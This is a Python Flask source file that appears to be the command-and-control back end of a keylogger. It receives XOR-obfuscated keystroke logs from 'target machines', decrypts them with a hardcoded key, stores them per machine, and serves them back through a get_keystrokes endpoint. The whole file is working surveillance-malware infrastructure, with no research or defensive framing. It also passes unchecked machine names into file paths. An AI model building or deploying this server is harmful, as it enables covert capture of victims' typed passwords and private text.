import os
from datetime import datetime
from flask import Flask, jsonify, request, json
from flask_cors import CORS
import time
from dotenv import load_dotenv




DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")

def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d") + ".txt"

app = Flask('app')
CORS(app)

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    print(data)

    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), '..', '.env'))  # Load environment variables from .env file
    key = os.getenv("KEY_ENCRYPTION")
    log_data_decrypted = decrypt("secretkey1", data["data"])
    print(f"Decrypted data: {log_data_decrypted}")

    machine_folder = os.path.join(DATA_FOLDER, next(iter(machine)))
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    new_entry = {
        "timestamp": timestamp,
        "data": log_data_decrypted
    }

    # Read existing data if the file exists
    existing_data = []
    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
        with open(file_path, "r", encoding="utf-8") as f:
            try:
                existing_data = json.load(f)  # Load JSON list
            except json.JSONDecodeError:
                print("Error: JSON file is corrupted or empty. Resetting file.")
                existing_data = []

    # Append the new entry
    existing_data.append(new_entry)

    # Write back the full JSON list efficiently
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(existing_data, f, ensure_ascii=False, indent=4)

    return jsonify({"status": "success", "file": file_path, "data": log_data_decrypted}), 200

def decrypt(key: str, data: str):
    decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))
    return decrypted


@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    machines = os.listdir(DATA_FOLDER)
    return jsonify({"machines": machines}), 200


@app.route('/api/get_keystrokes', methods=['GET'])
def get_target_machine_key_strokes():
    target_machine = request.args.get('target_machine')
    if not target_machine:
        return jsonify({"error": "Missing target_machine parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    files = sorted(os.listdir(machine_folder), reverse=False)  # Oldest first
    keystrokes = []

    for file in files:
        file_path = os.path.join(machine_folder, file)
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                file_data = json.load(f)  # Load the entire JSON list
                if isinstance(file_data, list):  # Ensure it's a valid list
                    keystrokes.extend(file_data)
        except json.JSONDecodeError:
            print(f"Warning: Skipping corrupted file {file_path}")

    # # Sort by timestamp (assuming valid timestamps)
    # try:
    #     keystrokes.sort(key=lambda x: datetime.strptime(x["timestamp"], "%Y-%m-%d %H:%M:%S"))
    # except KeyError:
    #     return jsonify({"error": "Invalid data format in logs"}), 500

    return jsonify({"keystrokes": keystrokes}), 200

@app.route('/api/check_passwords', methods=['POST'])
def check_passwords():
    data = request.get_json()
    print(data)
    passwords_file_path = os.path.join(os.path.dirname(__file__), 'passwords.json')
    if not data or "passwords" not in data:
        return jsonify({"error": "Invalid payload"}), 400
    with open(passwords_file_path, "r", encoding="utf-8") as f:
        passwords = json.load(f)
    print(passwords)
    if data["passwords"] in passwords.values():
        return jsonify({"status": "success"}), 200
    return jsonify({"error": "Password not found"}), 404

if __name__ == '__main__':
    app.run(debug=True)
